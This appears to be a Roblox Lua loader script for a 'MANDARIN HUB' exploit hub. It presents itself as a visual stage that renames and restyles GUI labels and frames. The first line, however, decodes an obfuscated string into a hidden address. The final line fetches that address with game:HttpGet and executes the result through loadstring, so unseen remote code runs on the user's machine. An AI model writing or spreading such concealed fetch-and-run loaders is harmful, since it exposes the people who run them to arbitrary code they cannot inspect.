
--[[ STAGE 2: VISUAL CORE ]]
local vVRvTtaf0Lxk45eIwSRk4="\004\021\019\086\029\029\037\035\058\064\054\125\067\077\074\083\150\103\091\099\100\118\180\133\119\125\149\205\157\163\150\158\178\177\174\188\182\202\194\203\014\208\208\234\036\229\231\239\241\249\251\069\012\015\016\090\041\036\034\056\051\055\056\078\064\087\090\082\100\102\111\111\102\180\128\123\143\199\204\230\162\170\171\176\177"local H75tIbz3rnBaH=231 local GEG2cqvFbhmPDbZYj6NG=116 local LeD6B9gM5kfN0=0 local BvdhdBXrcvOGzct_8t5jX=5 local mIpYtt5of9LSTm=5 local uV3hf4YbmDlnl=true local APAMcV5YDlfix85GjkGXr=bit32 and bit32.bxor if not APAMcV5YDlfix85GjkGXr then APAMcV5YDlfix85GjkGXr=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local DEiDSJr4iDR1Js7ssxab={}for yQc5LXgQDFiyDRDotpgi6=1,#vVRvTtaf0Lxk45eIwSRk4 do local sxPAC_YScpWMbt_ddgk7qy=string.byte(vVRvTtaf0Lxk45eIwSRk4,yQc5LXgQDFiyDRDotpgi6)local YkKPIAmJRBfDzlBh=(GEG2cqvFbhmPDbZYj6NG+(yQc5LXgQDFiyDRDotpgi6*BvdhdBXrcvOGzct_8t5jX)+mIpYtt5of9LSTm)%256 if LeD6B9gM5kfN0==0 then sxPAC_YScpWMbt_ddgk7qy=(sxPAC_YScpWMbt_ddgk7qy-YkKPIAmJRBfDzlBh)%256 DEiDSJr4iDR1Js7ssxab[yQc5LXgQDFiyDRDotpgi6]=string.char(APAMcV5YDlfix85GjkGXr(sxPAC_YScpWMbt_ddgk7qy,H75tIbz3rnBaH))else sxPAC_YScpWMbt_ddgk7qy=APAMcV5YDlfix85GjkGXr(sxPAC_YScpWMbt_ddgk7qy,H75tIbz3rnBaH)DEiDSJr4iDR1Js7ssxab[yQc5LXgQDFiyDRDotpgi6]=string.char((sxPAC_YScpWMbt_ddgk7qy-YkKPIAmJRBfDzlBh)%256)end end local Qcqjsr2cO15d_=table.concat(DEiDSJr4iDR1Js7ssxab)if uV3hf4YbmDlnl then Qcqjsr2cO15d_=string.reverse(Qcqjsr2cO15d_)end local HHM8wjhrgd1sM=Qcqjsr2cO15d_
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(HHM8wjhrgd1sM))()
